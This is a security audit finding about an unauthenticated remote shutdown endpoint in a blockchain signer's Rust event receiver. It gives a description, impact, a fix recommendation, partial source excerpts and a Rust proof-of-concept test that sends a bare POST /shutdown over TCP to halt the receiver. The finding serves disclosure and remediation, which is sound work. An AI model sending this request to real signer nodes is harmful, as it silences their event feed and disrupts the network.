### Title
Unauthenticated remote DoS via single `POST /shutdown` to `SignerEventReceiver` - (`libsigner/src/events.rs`)

### Summary
`SignerEventReceiver::next_event` matches `request.url() == "/shutdown"` and unconditionally stores `true` into `stop_signal` before returning `EventError::Terminated`, with no authentication, secret, or origin check preceding it. Any TCP client that can reach the bound event-listener port can send one crafted `POST /shutdown` request and permanently halt the signer's event-receiver main loop.

### Finding Description
In `next_event` (`libsigner/src/events.rs:413-459`), the request dispatch checks `request.method() == Post`, then branches on `request.url()`. The `/shutdown` branch at `libsigner/src/events.rs:443-445`:
```rust
} else if request.url() == "/shutdown" {
    event_receiver.stop_signal.store(true, Ordering::SeqCst);
    Err(EventError::Terminated)
```
performs the atomic store unconditionally — there is no check of a shared secret, no verification that the request came from the local node process, no signature or token of any kind. Compare this to the legitimate stop path: `SignerStopSignaler::send` (`libsigner/src/events.rs:378-395`) — intended to be called only by the signer's own runloop — which connects to `self.local_addr` and sends exactly the same bare `POST /shutdown HTTP/1.1` request. Any external TCP peer that can reach the same address can replay this exact request and achieve the identical effect, since the server-side handler cannot distinguish the legitimate internal caller from an external attacker.

Once `stop_signal` is set, `is_stopped()` (`libsigner/src/events.rs:462-464`) returns true, and the `Err(EventError::Terminated)` return value causes `main_loop` (`libsigner/src/events.rs:284-312`) to `break` at line 299, permanently ending the event-receiver thread with no restart logic. All subsequent legitimate events from the node (StackerDB chunk pushes, burn-block events, block proposals) can no longer be delivered to the signer since the receiving `HttpServer` loop has exited.

### Impact Explanation
The signer's `SignerEventReceiver` is the sole ingestion point for the node-to-signer event feed (StackerDB chunk events, block-validation responses, burn-block notifications). A single unauthenticated POST from any TCP client that can reach the bind address permanently disables this feed, causing the signer to stop observing block proposals and StackerDB chunk events indefinitely, until the process is restarted. This matches the "Critical - remote crash/unauthenticated DoS from few messages" category, since it is a single-message, repeatable, unauthenticated denial of service against the signer's core event pipeline.

### Likelihood Explanation
The only precondition is that the attacker can open a TCP connection to the port the `SignerEventReceiver` is bound to (stated as reachable in this analysis's preconditions). No secret, credential, signature, or privileged role is required — the attacker only needs to send a well-formed HTTP `POST /shutdown` request, exactly mirroring the legitimate internal shutdown trigger in `SignerStopSignaler::send`. The attack is trivially repeatable and costs a single TCP round trip.

### Recommendation
Do not expose an unauthenticated network-triggerable shutdown endpoint. Either: (1) remove the HTTP `/shutdown` path entirely and trigger the stop signal via an in-process/local IPC mechanism (e.g., a local unix socket, or a shared `Arc<AtomicBool>` set directly from the owning process without going over the network), or (2) require a shared secret/token (e.g., an HMAC over a nonce, or a pre-shared bearer token compared in constant time) on the `/shutdown` request, verified before the `stop_signal.store` call, and additionally verify the connection originates from a trusted loopback/allow-listed source.

#[test]
fn test_unauthenticated_remote_shutdown() {
    use std::net::{SocketAddr, TcpStream};
    use std::io::Write;
    use std::thread;

    let mut receiver: SignerEventReceiver<crate::v0::messages::SignerMessage> =
        SignerEventReceiver::new(false);
    let addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
    let bound = receiver.bind(addr).unwrap();

    let handle = thread::spawn(move || {
        // Simulate an unprivileged remote client with no credentials.
        let mut stream = TcpStream::connect(bound).unwrap();
        let body = "attacker shutdown";
        let req = format!(
            "POST /shutdown HTTP/1.1\r\nHost: {}\r\nConnection: close\r\nContent-Length: {}\r\nContent-Type: text/plain\r\n\r\n{}",
            bound, body.len(), body
        );
        stream.write_all(req.as_bytes()).unwrap();
    });

    // Attacker's single request causes next_event() to store stop_signal=true
    // and return Err(EventError::Terminated).
    let result = receiver.next_event();
    assert!(matches!(result, Err(EventError::Terminated)));
    assert!(receiver.is_stopped()); // proves permanent halt with no auth check

    handle.join().unwrap();

    // Any subsequent legitimate node event would now be dropped because
    // main_loop() would break at the `Err(EventError::Terminated)` arm

}

        loop {

                Ok(event) => event,

                }

                    // we're done
                    info!("Caught termination signal");
                    break;

                }
            };

            }

    fn next_event(&mut self) -> Result<SignerEvent<T>, EventError> {
        self.with_server(|event_receiver, http_server, _is_mainnet| {
            // were we asked to terminate?
            if event_receiver.is_stopped() {
                return Err(EventError::Terminated);
            }
            debug!("Request handling");
            let request = http_server.recv()?;
            debug!("Got request"; "method" => %request.method(), "path" => request.url());

            if request.url() == "/status" {
                request
                .respond(HttpResponse::from_string("OK"))
                .expect("response failed");
                return Ok(SignerEvent::StatusCheck);
            }

            if request.method() != &HttpMethod::Post {
                return Err(EventError::MalformedRequest(format!(
                    "Unrecognized method '{}'",
                    request.method(),
                )));
            }
            debug!("Processing {} event", request.url());
            if request.url() == "/stackerdb_chunks" {
                process_event::<T, StackerDBChunksEvent>(request)
            } else if request.url() == "/proposal_response" {
                process_event::<T, BlockValidateResponse>(request)
            } else if request.url() == "/new_burn_block" {
                process_event::<T, BurnBlockEvent>(request)
            } else if request.url() == "/shutdown" {
                event_receiver.stop_signal.store(true, Ordering::SeqCst);
                Err(EventError::Terminated)
            } else if request.url() == "/new_block" {
                process_event::<T, StacksBlockEvent>(request)
            } else {
                let url = request.url().to_string();
                debug!(
                    "[{:?}] next_event got request with unexpected url {}, return OK so other side doesn't keep sending this",
                    event_receiver.local_addr,
                    url
                );
                ack_dispatcher(request);
                Err(EventError::UnrecognizedEvent(url))
            }
        })?
    }
